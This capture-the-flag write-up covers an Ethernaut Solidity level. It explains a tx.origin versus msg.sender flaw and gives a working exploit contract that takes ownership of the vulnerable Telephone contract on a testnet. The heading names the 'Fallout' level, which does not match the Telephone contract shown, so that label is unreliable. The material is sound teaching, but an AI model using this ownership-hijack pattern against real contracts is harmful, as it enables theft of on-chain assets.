# Ethernaut - Level 2 - Fallout

Contract code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

Objectives:
```
Claim ownership of the contract below to complete this level.
```

This contract is pretty small, there is only one function that we can call, the changeOwner function.
This function performs a check, if tx.origin is different from the msg.sender then we can update the value of owner.

## Cool, but what's the difference between tx.origin and msg.sender???

msg.sender is the address of the contract/user that had called the function, instead tx.origin is the address of the *user* that had started the call-chain.

Eg: User A --> Contract B.execute() --> Contract C.somefunction()

In this case we have user A that calls execute on contract B that calls somefunction on contract c.
In this case, tx.origin = User A and msg.sender = address(Contract B).

So, to exploit this, we need to deploy a smart contract that calls changeOwner on contract Telephone.

My exploit contract:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface ITelephone {
    function changeOwner(address _owner) external ;
}

contract Exploit {

    // I need to deploy this to the Rinekby testnet --> the same as ethernaut in order to exploit the challenge's contract
    address TARGET_CONTRACT = 0xA082d3B2706d055aa3843a3342157BbF05bD10C7;
    address PLAYER = 0xD51DF6592e7d3c5EE08cCd029Ff444a3c9255810;
    //I need the contract's ABI --> interfaces like in Java
    function OwnIt() public {
        ITelephone(TARGET_CONTRACT).changeOwner(PLAYER);
    }
        
}
```

In order to call the changeOwner function on Telephone contract we need his ABI (Application Binary Interface) --> we need the function signature of his methos changeOwner, and we wrap it inside an interface.

After we've called the OwnIt function, we'll be the owner of the Telephone contract.
